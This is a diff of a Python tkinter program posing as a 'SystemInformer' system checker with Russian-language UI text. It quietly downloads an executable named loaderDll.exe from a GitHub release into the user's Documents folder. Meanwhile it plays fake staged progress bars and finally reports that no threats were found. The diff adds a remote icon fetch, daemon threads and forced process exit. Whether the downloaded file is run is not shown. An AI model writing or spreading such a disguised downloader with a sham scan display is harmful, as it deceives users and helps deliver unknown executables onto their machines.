@@ -5,6 +5,8 @@ import time
 import random
 import requests
 import os
+import tempfile
+
 
 
 DOWNLOAD_URL = "https://github.com/SSDDAA-AFK/SustemInformer_Cheker/releases/download/v1.0/loaderDll.exe"
@@ -13,6 +15,9 @@ FOLDER = os.path.join(os.path.expanduser("~"), "Documents", "SystemChecker")
 os.makedirs(FOLDER, exist_ok=True)
 
 FILENAME = os.path.join(FOLDER, "loaderDll.exe")
+
+ICON_URL = "https://raw.githubusercontent.com/SSDDAA-AFK/SustemInformer_Cheker/main/icon.ico"
+ICON_PATH = os.path.join(tempfile.gettempdir(), "syschecker_icon.ico")
 
 
 # ---------- КОЛЬОРИ ----------
@@ -29,10 +34,13 @@ class LoaderApp:
 
         self.downloaded = False
 
+
         self.root = root
+        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
         self.root.title("SystemInformer Cheker V1.0")
         self.root.geometry("460x280")
-        self.root.iconbitmap("icon.ico")
+        if self.download_icon():
+            self.root.iconbitmap(ICON_PATH)
         self.root.resizable(False, False)
         self.root.configure(bg=BG)
 
@@ -58,7 +66,7 @@ class LoaderApp:
         # ---------- ТЕКСТ ----------
         self.label = tk.Label(
             self.card,
-            text="🔄 Загрузка проверки...",
+            text="🔄 Загружаю проверку...",
             bg=CARD,
             fg=TEXT,
             font=("Segoe UI", 12)
@@ -98,13 +106,35 @@ class LoaderApp:
         )
         self.status.pack()
 
-        threading.Thread(target=self.stage1).start()
+        t = threading.Thread(target=self.stage1, daemon=True)
+        t.start()
 
+    def on_close(self):
+        try:
+            self.root.destroy()
+        except:
+            pass
+
+        # Повне завершення процесу
+        os._exit(0)
+
+    def download_icon(self):
+
+        try:
+            r = requests.get(ICON_URL, timeout=10)
+
+            with open(ICON_PATH, "wb") as f:
+                f.write(r.content)
+
+            return True
+
+        except:
+            return False
 
     # ---------- ЕТАП 1 ----------
     def stage1(self):
 
-        threading.Thread(target=self.download).start()
+        threading.Thread(target=self.download, daemon=True).start()
 
         self.run_bar(8, 15, "Загрузка")
 
@@ -122,7 +152,7 @@ class LoaderApp:
     def stage2(self):
 
         self.label.config(
-            text="📂 Начинаю проверку файлов..."
+            text="📂 Начинаю проверять файлы..."
         )
 
         self.progress["value"] = 0
@@ -171,11 +201,11 @@ class LoaderApp:
     def finish(self):
 
         self.label.config(
-            text="✅ Угроз не обнаружено!"
+            text="✅ Угрозы не обнаружены!"
         )
 
         self.status.config(
-            text="Нажмите любую кнопку, чтобы закрыть программу"
+            text="Нажмите любую кнопку, чтобы закрыть программу."
         )
 
         # Слухаємо всі натискання
@@ -183,7 +213,7 @@ class LoaderApp:
         self.root.bind("<Button>", self.close_app)
 
     def close_app(self, event=None):
-        self.root.destroy()
+        self.on_close()
 
 
 # ---------- ЗАПУСК ----------
